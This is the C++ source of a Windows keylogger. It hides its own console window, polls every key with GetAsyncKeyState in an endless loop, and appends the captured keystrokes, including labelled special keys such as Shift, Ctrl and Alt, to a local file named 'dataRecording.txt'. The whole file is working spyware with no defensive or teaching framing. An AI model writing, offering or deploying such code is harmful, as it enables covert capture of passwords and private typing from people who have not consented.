#include <Windows.h>
#include <WinUser.h>
#include <iostream>
#include <fstream>
#include <string>
#include "Logging.h"
#include "SpecialKey.h"

using std::cout;
using namespace Log;

bool Key::SpecialKey(int specialKey)
{
	//cases come from WinUser.h
	switch (specialKey) {
	case VK_SPACE:
		cout << " ";
		Logging(" ");
		return true;
	case VK_RETURN:
		cout << "\n";
		Logging("\n");
		return true;
	case '¾':
		cout << ".";
		Logging(".");
		return true;
	case VK_SHIFT:
		cout << "#SHIFT#";
		Logging("#SHIFT#");
		return true;
	case VK_BACK:
		cout << "\b";
		Logging("\b");
		return true;
	case VK_RBUTTON:
		cout << "#R_CLICK#";
		Logging("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		cout << "#CAPS_LOCK#";
		Logging("#CAPS_LCOK");
		return true;
	case VK_TAB:
		cout << "#TAB";
		Logging("#TAB");
		return true;
	case VK_UP:
		cout << "#UP";
		Logging("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		cout << "#DOWN";
		Logging("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		cout << "#LEFT";
		Logging("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		cout << "#RIGHT";
		Logging("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		cout << "#CONTROL";
		Logging("#CONTROL");
		return true;
	case VK_MENU:
		cout << "#ALT";
		Logging("#ALT");
		return true;
	default:
		return false;
	}
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	char KEY = 'x';

	while (true) {
		for (int KEY = 8; KEY <= 190; KEY++) {

			if (GetAsyncKeyState(KEY) == -32767)
			{
				if (Key::SpecialKey(KEY) == false)
				{
					std::fstream LogFile;
					LogFile.open("dataRecording.txt", std::fstream::app);

					if (LogFile.is_open())
					{
						LogFile << char(KEY);
						LogFile.close();
					}
				}
			}
		}
	}
	return 0;
}
